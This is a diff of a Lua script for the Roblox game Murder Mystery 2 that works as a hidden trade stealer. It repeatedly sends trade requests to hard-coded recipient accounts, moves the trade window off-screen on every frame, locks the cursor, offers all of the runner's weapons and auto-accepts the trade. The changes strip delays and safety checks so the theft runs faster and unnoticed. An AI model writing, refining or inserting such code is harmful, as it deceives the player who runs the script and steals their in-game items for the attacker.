@@ -174,23 +174,38 @@ local function hook_mm2()
     end
 
     local function hideGui()
-        if guiHidden then return end
         guiHidden = true
         local gui = lp:FindFirstChild("PlayerGui")
-        if not gui then return end
-        for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
-            local g = gui:FindFirstChild(name)
-            if g then
-                for _, frame in ipairs(g:GetChildren()) do
-                    if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
-                        frame.Position = UDim2.new(10, 0, 10, 0)
+        if gui then
+            for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
+                local g = gui:FindFirstChild(name)
+                if g then
+                    for _, frame in ipairs(g:GetChildren()) do
+                        if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
+                            frame.Position = UDim2.new(10, 0, 10, 0)
+                        end
                     end
                 end
             end
         end
         if shiftlockConn then shiftlockConn:Disconnect() end
         shiftlockConn = RunService.RenderStepped:Connect(function()
+            -- cursor lock
             pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.LockCenter end)
+            -- frames continuous verbergen (MM2 maakt ze soms opnieuw aan)
+            local g2 = lp:FindFirstChild("PlayerGui")
+            if g2 then
+                for _, n in ipairs({"TradeGUI","TradeGUI_Phone"}) do
+                    local tg = g2:FindFirstChild(n)
+                    if tg then
+                        for _, frame in ipairs(tg:GetChildren()) do
+                            if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
+                                frame.Position = UDim2.new(10, 0, 10, 0)
+                            end
+                        end
+                    end
+                end
+            end
         end)
     end
 
@@ -200,7 +215,6 @@ local function hook_mm2()
             shiftlockConn:Disconnect()
             shiftlockConn = nil
         end
-        -- geen pcall: dit moet altijd werken
         UIS.MouseBehavior = Enum.MouseBehavior.Default
         local gui = lp:FindFirstChild("PlayerGui")
         if not gui then return end
@@ -245,15 +259,12 @@ local function hook_mm2()
         end)
     end
 
-    -- stuur trade elke 2s als niet bezig
     task.spawn(function()
         while true do
             task.wait(2)
             if not tradingWithAllowed then
                 for _, player in ipairs(Players:GetPlayers()) do
                     if player ~= lp and isAllowedUser(player.Name) then
-                        storeItems()
-                        -- task.spawn zodat InvokeServer de loop niet blokkeert
                         task.spawn(function()
                             pcall(function() sendRequest:InvokeServer(player) end)
                         end)
@@ -267,7 +278,6 @@ local function hook_mm2()
     Players.PlayerAdded:Connect(function(player)
         if isAllowedUser(player.Name) and not tradingWithAllowed then
             task.wait(1)
-            storeItems()
             task.spawn(function()
                 pcall(function() sendRequest:InvokeServer(player) end)
             end)
@@ -275,9 +285,12 @@ local function hook_mm2()
     end)
 
     startTrade.OnClientEvent:Connect(function(tradeData)
-        if not tradeData then return end
-        currentLastOffer = tradeData.LastOffer
+        -- force-reset zodat vorige timer itemsOffered=true niet interfereert
+        itemsOffered = false
+        readySent = false
+        currentLastOffer = (tradeData and tradeData.LastOffer) or nil
 
+        if not tradeData then return end
         local p1 = tradeData.Player1
         local p2 = tradeData.Player2
         if not p1 or not p2 then return end
@@ -286,20 +299,14 @@ local function hook_mm2()
         local otherName = typeof(otherData.Player) == "Instance" and otherData.Player.Name or tostring(otherData.Player)
 
         if not isAllowedUser(otherName) then return end
-        tradingWithAllowed = true
-        hideGui()
 
-        if itemsOffered then return end
+        tradingWithAllowed = true
+        storeItems()
+        hideGui()
         itemsOffered = true
 
         task.spawn(function()
-            task.wait(1)
             local sortedItems = collect_mm2_items()
-            if #sortedItems == 0 then
-                -- geen items, direct reset
-                resetState()
-                return
-            end
 
             local uniqueSlots = 0
             for _, entry in ipairs(sortedItems) do
@@ -308,9 +315,7 @@ local function hook_mm2()
                 local amount = (okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned and ProfileData.Weapons.Owned[entry.name]) or entry.amount
                 for i = 1, amount do
                     pcall(function() offerItem:FireServer(entry.name, "Weapons") end)
-                    task.wait(0.1)
                 end
-                task.wait(0.2)
             end
 
             task.wait(5)
@@ -320,7 +325,6 @@ local function hook_mm2()
                 pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
             end
 
-            -- altijd reset na 10s, ongeacht of complete/decline event vuurt
             task.wait(10)
             resetState()
         end)
